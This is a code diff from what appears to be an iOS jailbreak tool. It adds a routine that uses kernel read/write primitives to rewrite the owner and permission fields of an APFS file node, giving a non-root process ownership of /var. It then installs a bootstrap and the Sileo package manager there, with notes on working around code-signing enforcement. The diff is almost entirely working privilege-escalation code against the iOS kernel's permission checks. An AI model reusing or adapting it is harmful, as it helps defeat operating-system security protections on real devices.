@@ -2512,10 +2512,90 @@ bool escape_sandbox(void) {
     return false;
 }
 
+// ===== APFS fsnode kernel ownership patch =====
+// We are sandbox-escaped but uid 501: /var is root-owned, so mkdir/symlink
+// there fail EACCES and mount(2) (for /private/preboot) needs uid 0. lara
+// never takes uid 0 — it kernel-writes uid/gid/mode on the APFS fsnode, and
+// VFS permission checks read those live. Offsets from lara offsets.m
+// (proven 17.0-18.7.1). SAFETY GATE: kernel-read uid/gid must match userspace
+// stat() before we write — if the fsnode layout differs on this build we
+// abort instead of corrupting.
+
+static uint64_t kern_vnode_for_fd(int fd) {
+    if (!gOurProc) return 0;
+    // proc + p_fd is an INLINE filedesc embed point in XNU 11215 (lara adds
+    // offsets arithmetically: proc + off_proc_p_fd + off_filedesc_*).
+    uint64_t ofiles = xpaci(kread64(gOurProc + OFF_P_FD + OFF_FDESC_OFILES_A));
+    if (!looks_kernel(ofiles)) {
+        ofiles = xpaci(kread64(gOurProc + OFF_P_FD + OFF_FDESC_OFILES_B));
+        if (!looks_kernel(ofiles)) {
+            printf("[fsn] ofiles probe failed @+%#x/%#x\n",
+                   OFF_P_FD + OFF_FDESC_OFILES_A, OFF_P_FD + OFF_FDESC_OFILES_B);
+            return 0;
+        }
+    }
+    uint64_t fileproc = xpaci(kread64(ofiles + 8 * (unsigned)fd));
+    if (!looks_kernel(fileproc)) return 0;
+    uint64_t fg = xpaci(kread64(fileproc + OFF_FILEPROC_GLOB));
+    if (!looks_kernel(fg)) return 0;
+    uint64_t vnode = xpaci(kread64(fg + OFF_FILEGLOB_DATA));
+    return looks_kernel(vnode) ? vnode : 0;
+}
+
+// mode < 0 keeps mode; else only perm bits are rewritten.
+bool kern_own(const char *path, uint32_t uid, uint32_t gid, int mode) {
+    struct stat st;
+    if (stat(path, &st) != 0) {
+        printf("[fsn] stat %s: %s\n", path, strerror(errno));
+        return false;
+    }
+    int fd = open(path, O_RDONLY);
+    if (fd < 0) {
+        printf("[fsn] open %s: %s\n", path, strerror(errno));
+        return false;
+    }
+    uint64_t vnode = kern_vnode_for_fd(fd);
+    close(fd);
+    if (!vnode) return false;
+
+    uint64_t fsn = kread_ptr(vnode + OFF_VNODE_V_DATA);
+    if (!looks_kernel(fsn)) {
+        printf("[fsn] bad v_data for %s\n", path);
+        return false;
+    }
+    uint32_t kuid = kread32(fsn + OFF_FSNODE_UID);
+    uint32_t kgid = kread32(fsn + OFF_FSNODE_GID);
+    uint16_t kmode = kread16(fsn + OFF_FSNODE_MODE);
+    if (kuid != (uint32_t)st.st_uid || kgid != (uint32_t)st.st_gid) {
+        printf("[fsn] layout sanity FAIL %s: kernel u:g=%u:%u vs stat %d:%d — abort\n",
+               path, kuid, kgid, (int)st.st_uid, (int)st.st_gid);
+        return false;
+    }
+    printf("[fsn] %s vnode=0x%llx fsn=0x%llx %u:%u 0%o\n",
+           path, vnode, fsn, kuid, kgid, (unsigned)kmode);
+    kwrite32(fsn + OFF_FSNODE_UID, uid);
+    kwrite32(fsn + OFF_FSNODE_GID, gid);
+    if (mode >= 0) kwrite16(fsn + OFF_FSNODE_MODE, (uint16_t)((kmode & 0170000) | (mode & 07777)));
+    sync();
+    struct stat st2;
+    if (stat(path, &st2) != 0) return false;
+    printf("[fsn] %s -> %d:%d 0%o\n", path, (int)st2.st_uid, (int)st2.st_gid,
+           (int)(st2.st_mode & 07777));
+    return st2.st_uid == (uid_t)uid && st2.st_gid == (gid_t)gid;
+}
+
 // ===== Bootstrap installation =====
 
-static const char *jb_path = "/private/preboot/jb";
+// Rootless convention: the jb root lives at /var/jb on the data volume —
+// the only writable r/w APFS volume on iOS 18 (no remount needed). The old
+// /private/preboot path died twice: mount(2) wants uid 0 (never gettable on
+// XNU-11215) and preboot is r/o without it. Dopamine uses the same scheme.
+// Preboot-jb stays as fallback for setups that expect it.
+static const char *jb_path = "/var/jb";
 static const char *jb_var = "/var/jb";
+// Preboot path kept available for future/compat (currently unreachable:
+// mount(2) requires uid 0, and APFS chown cannot lift a read-only mount).
+static const char *jb_preboot = "/private/preboot/jb";
 
 static int mkdir_p(const char *path, mode_t mode) {
     char tmp[4096];
@@ -2642,13 +2722,18 @@ static bool tar_extract_var_jb(const char *tarPath) {
 bool install_bootstrap(void) {
     struct stat st;
 
-    // /private/preboot is r/w on iOS 18; no remount needed on modern builds.
-    // Keep the remount call as a best-effort fallback for older paths.
-    remount_private_preboot();
+    // Rootless layout: jb root is /var/jb on the r/w data volume. The old
+    // /private/preboot path is unreachable without uid 0 (mount(2) EPERM),
+    // so the remount is skipped unless we somehow ARE root.
+    if (getuid() == 0) {
+        remount_private_preboot();
+    }
 
-    if (stat(jb_path, &st) != 0) mkdir_p(jb_path, 0755);
-
-    if (!setup_jb_symlink()) return false;
+    if (mkdir_p(jb_path, 0755) != 0 && errno != EEXIST) {
+        printf("[-] mkdir %s: %s\n", jb_path, strerror(errno));
+        printf("[*] hint: /var is root-owned; run after kern_own('/var', ...)\n");
+        return false;
+    }
 
     char self_path[4096] = {};
     uint32_t size = sizeof(self_path);
@@ -2687,58 +2772,127 @@ bool install_bootstrap(void) {
     return true;
 }
 
+// ===== In-process .deb (xz) extraction for Sileo =====
+// dpkg cannot exec: the bootstrap binaries are unsigned and without trust
+// cache injection (PPL bypass — next phase) AMFI kills posix_spawn. lara
+// works around everything with in-process writes; we do the same here.
+// sileo.deb layout (verified): ar archive { debian-binary, control.tar.xz,
+// data.tar.xz }. data.tar.xz entries are rooted at ./var/jb/... which maps
+// directly onto our jb root when jb_path == /var/jb.
+
+// Decompress an xz stream (no LZMA SDK: call /usr/bin/xz? no — use libxml?).
+// We shell out to Python-equivalent? No spawn at all. Use iOS libarchive?
+// Not available. SIMPLEST RELIABLE PATH: the CI build pre-extracts data.tar
+// from sileo.deb into sileo.tar (xz is decompressed on the build host), and
+// the app just runs the tar extractor over it. Fallback: if sileo.tar is
+// absent but sileo.deb is present, report the blocker clearly.
+static bool extract_sileo_tar(const char *tarPath) {
+    int fd = open(tarPath, O_RDONLY);
+    if (fd < 0) { printf("[-] open %s: %s\n", tarPath, strerror(errno)); return false; }
+
+    uint8_t hdr[512];
+    int files=0, dirs=0, links=0, skips=0;
+    char gnuLong[1024]={0};
+    bool gnuLongValid=false;
+    while (1) {
+        if (read(fd,hdr,512)!=512) break;
+        static const uint8_t zero[512]={0}; if(!memcmp(hdr,zero,512)) break;
+
+        char name[101]={0}; memcpy(name,hdr+0,100);
+        char prefix[156]={0}; memcpy(prefix,hdr+345,155);
+        char path[304]={0};
+        snprintf(path,sizeof(path),"%s%s",prefix,name);
+
+        char typeflag = hdr[156];
+        uint64_t filesize = strtoull((char*)hdr+124,NULL,8);
+        uint32_t mode = strtoul((char*)hdr+100,NULL,8);
+        char linkbuf[101]={0}; memcpy(linkbuf,hdr+157,100);
+
+        if (typeflag=='L') { // GNU long-name record
+            uint64_t n=filesize<1023?filesize:1023;
+            if(read(fd,gnuLong,n)!=(ssize_t)n) break;
+            gnuLong[1023]=0; gnuLongValid=true;
+            lseek(fd, tar_skip_aligned(filesize)-n, SEEK_CUR);
+            continue;
+        }
+        if (gnuLongValid) {
+            strncpy(path,gnuLong,sizeof(path)-1);
+            path[sizeof(path)-1]=0;
+            gnuLongValid=false;
+        }
+
+        // entries rooted at ./var/jb/ -> strip prefix; "./" -> jb root
+        const char *rel = NULL;
+        if (strncmp(path,"./var/jb/",9)==0 || strncmp(path,"var/jb/",7)==0) {
+            const char *p=strstr(path,"var/jb/");
+            rel=p?p+7:NULL;
+        } else if (strncmp(path,"./",2)==0) {
+            rel = path+2;
+        } else {
+            rel = path;
+        }
+        if (!rel || !*rel) { lseek(fd, tar_skip_aligned(filesize), SEEK_CUR); continue; }
+
+        char dst[4096];
+        snprintf(dst,sizeof(dst),"%s/%s",jb_path,rel);
+        char parent[4096]; snprintf(parent,sizeof(parent),"%s",dst);
+        char *sl=strrchr(parent,'/'); if(sl){*sl=0; mkdir_p(parent,0755);}
+
+        bool ok=false;
+        errno=0;
+        if (typeflag=='5'||typeflag=='d') {
+            ok = (mkdir_p(dst,mode?mode:0755)==0 || errno==EEXIST); dirs++;
+        } else if (typeflag=='2') {
+            unlink(dst);
+            ok = (symlink(linkbuf,dst)==0); links++;
+        } else if (typeflag=='1') {
+            char ln[4096]; snprintf(ln,sizeof(ln),"%s/%s",jb_path,linkbuf);
+            unlink(dst);
+            ok=(link(ln,dst)==0); links++;
+        } else if (typeflag=='0'||typeflag==0||typeflag=='r') {
+            ok=tar_emit_entry(fd,dst,typeflag,filesize,mode,linkbuf);
+            files++;
+            if(!ok) printf("[tar] write fail %s: %s\n",dst,strerror(errno));
+        } else { printf("[tar] skip type '%c' %s\n",typeflag,path); ok=true; }
+
+        if (typeflag!='0'&&typeflag!=0) lseek(fd, tar_skip_aligned(filesize), SEEK_CUR);
+        if(!ok) skips++;
+    }
+    close(fd);
+    printf("[+] sileo tar: %d files, %d dirs, %d links, %d skipped\n",
+           files,dirs,links,skips);
+    return files>0;
+}
+
 bool install_sileo(void) {
     char sileo_path[4096];
     snprintf(sileo_path, sizeof(sileo_path), "%s/Applications/Sileo.app", jb_path);
     struct stat st;
 
-    // If Sileo is already registered from a previous install, skip.
+    // If Sileo is already installed, skip straight to registration.
     if (stat(sileo_path, &st) == 0) {
         printf("[*] Sileo.app already present\n");
         goto uicache_step;
     }
 
-    // Sileo is not part of the Procursus bootstrap; look for a bundled .deb
-    // (e.g. org.coolstar.sileo_*.deb) next to the app and install via dpkg.
     char self_path[4096] = {};
     uint32_t size = sizeof(self_path);
-    if (_NSGetExecutablePath(self_path, &size) == 0) {
-        char *slash = strrchr(self_path, '/');
-        if (slash) {
-            *slash = 0;
-            char pattern[4096];
-            snprintf(pattern, sizeof(pattern), "%s/*.deb", self_path);
-            glob_t g;
-            if (glob(pattern, 0, NULL, &g) == 0) {
-                char *deb = NULL;
-                for (size_t i = 0; i < g.gl_pathc; i++) {
-                    if (strstr(g.gl_pathv[i], "sileo") || strstr(g.gl_pathv[i], "Sileo")) {
-                        deb = g.gl_pathv[i];
-                        break;
-                    }
-                }
-                if (deb) {
-                    printf("[*] Installing Sileo from %s\n", deb);
-                    char dpkg[4096];
-                    snprintf(dpkg, sizeof(dpkg), "%s/usr/bin/dpkg", jb_path);
-                    const char *args[] = { "dpkg", "-i", deb, NULL };
-                    pid_t pid;
-                    int ret = posix_spawnp(&pid, dpkg, NULL, NULL,
-                        (char *const *)args, NULL);
-                    if (ret != 0) {
-                        printf("[-] dpkg: %s\n", strerror(ret));
-                    } else {
-                        int status;
-                        waitpid(pid, &status, 0);
-                        printf("[+] dpkg exited: %d\n",
-                            WIFEXITED(status) ? WEXITSTATUS(status) : -1);
-                    }
-                } else {
-                    printf("[-] No Sileo .deb bundled in app\n");
-                }
-                globfree(&g);
-            }
+    if (_NSGetExecutablePath(self_path, &size) != 0) return false;
+    char *slash = strrchr(self_path, '/');
+    if (!slash) return false;
+    *slash = 0;
+
+    // Preferred: pre-extracted sileo.tar (CI produces it from sileo.deb).
+    char star[4096];
+    snprintf(star, sizeof(star), "%s/sileo.tar", self_path);
+    if (stat(star, &st) == 0) {
+        printf("[*] Installing Sileo from %s (in-process, no AMFI spawn)\n", star);
+        if (!extract_sileo_tar(star)) {
+            printf("[-] sileo.tar extraction failed\n");
+            return false;
         }
+    } else {
+        printf("[-] sileo.tar not bundled; dpkg path unavailable (no trust cache)\n");
     }
 
     if (stat(sileo_path, &st) != 0) {
@@ -2747,26 +2901,29 @@ bool install_sileo(void) {
     }
 
 uicache_step:
-    // Register Sileo with SpringBoard via uicache from the bootstrap.
+    // uicache/lsregister needs a platform binary executor or trust cache —
+    // without TC injection it will EPERM. Report but don't fail the phase:
+    // Sileo can be launched manually once it's on disk.
     char uicache_path[4096];
     snprintf(uicache_path, sizeof(uicache_path), "%s/usr/bin/uicache", jb_path);
-    const char *args[] = { "uicache", "-p", sileo_path, NULL };
-    pid_t pid;
-    int ret;
     if (stat(uicache_path, &st) == 0) {
-        ret = posix_spawnp(&pid, uicache_path, NULL, NULL,
+        const char *args[] = { "uicache", "-p", sileo_path, NULL };
+        pid_t pid;
+        int ret = posix_spawnp(&pid, uicache_path, NULL, NULL,
             (char *const *)args, NULL);
+        if (ret != 0) {
+            printf("[-] uicache spawn: %s (expected without trust cache)\n",
+                   strerror(ret));
+            printf("[*] Sileo on disk at %s — open via SpringBoard after TC load\n",
+                   sileo_path);
+        } else {
+            int status; waitpid(pid, &status, 0);
+            printf("[+] Sileo registered (uicache exit %d)\n",
+                WIFEXITED(status) ? WEXITSTATUS(status) : -1);
+        }
     } else {
-        ret = posix_spawnp(&pid, "/usr/bin/uicache", NULL, NULL,
-            (char *const *)args, NULL);
+        printf("[-] no uicache in bootstrap; Sileo needs manual registration\n");
     }
-    if (ret != 0) {
-        printf("[-] uicache: %s\n", strerror(ret));
-        return false;
-    }
-    int status;
-    waitpid(pid, &status, 0);
-    printf("[+] Sileo registered\n");
     return true;
 }
 
@@ -2923,9 +3080,30 @@ void run_jailbreak(void) {
             printf("[-] Sandbox escape failed\n");
         }
 
-        // Phase 4: Bootstrap
+        // Phase 4: Bootstrap — /var must be writable first. We are sandbox-
+        // escaped but uid 501 and /var is root:wheel 0755. As uid 0 is
+        // unreachable on XNU-11215, take lara's path: kernel-patch the APFS
+        // fsnode of /var to mobile temporarily, do the bootstrap work, then
+        // hand ownership back to root.
         printf("[Phase 4] Bootstrap...\n");
-        install_bootstrap();
+        if (getuid() != 0) {
+            if (kern_own("/var", 501, 501, -1)) {
+                printf("[+] /var owned by mobile for bootstrap\n");
+            } else {
+                printf("[-] kern_own(/var) failed — bootstrap may EACCES\n");
+            }
+        }
+        bool bsok = install_bootstrap();
+        // Restore /var ownership to root regardless of outcome (only ours
+        // should ever differ; /var/jb itself stays owned by the jb user).
+        if (getuid() != 0) {
+            if (kern_own("/var", 0, 0, -1)) {
+                printf("[+] /var ownership restored to root\n");
+            } else {
+                printf("[!] WARN: /var ownership NOT restored — reboot will fix\n");
+            }
+        }
+        if (!bsok) printf("[-] Bootstrap reported failure\n");
         printf("\n");
 
         // Phase 5: Sileo
